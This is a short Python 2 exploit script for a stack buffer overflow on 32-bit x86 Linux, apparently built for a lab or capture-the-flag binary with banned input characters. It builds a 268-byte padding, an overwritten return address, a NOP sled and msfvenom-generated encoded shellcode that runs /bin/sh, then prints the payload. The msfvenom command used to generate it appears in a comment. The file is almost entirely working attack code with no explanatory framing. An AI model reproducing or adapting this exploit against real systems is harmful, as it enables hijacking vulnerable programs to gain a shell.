#!/bin/env python2
import struct
# import os
# import subprocess
#Banned characters 
# [hijklmn] or [0x68 - 0x6e]

"""Constants"""
len_to_addr = 268
ret_addr = 0xbffff4a0
char = "A"
nop = "\x90"
"""Shell Code (x86)"""
buf =  b""
buf += b"\xb8\x54\x93\xaf\xaa\xdb\xc8\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x06\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2"
buf += b"\xa1\xa2\x6f\xfa\x21\xea\x40\x88\xd9\x9c\xb1\x0c\x70"
buf += b"\x33\x47\x33\xd2\x98\xde\x55\x62\x15\x2c\x15"


"""Executable"""
EIP = struct.pack("I", ret_addr)
padding = char * (len_to_addr)
NOP_SLED = nop * 100
payload =  padding + EIP + NOP_SLED + buf
print payload
# print len(buf)
# print EIP
#msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 --platform linux -e x86/shikata_ga_nai -f python -b '\x00\x68\x69\x6a\x6b\x6c\x6d\x6e'
